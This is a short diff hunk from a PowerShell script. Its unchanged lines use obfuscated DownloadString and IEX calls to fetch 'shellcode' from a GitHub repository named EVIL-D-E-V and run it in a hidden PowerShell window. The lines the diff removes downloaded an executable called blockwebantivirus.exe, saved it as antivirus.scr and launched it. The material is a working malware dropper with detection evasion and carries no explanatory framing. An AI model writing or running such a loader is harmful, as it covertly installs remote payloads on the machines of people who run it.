@@ -68,7 +68,3 @@ $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/sh
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/blockwebantivirus.exe"
-$output = "$dir\antivirus.scr"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process $output
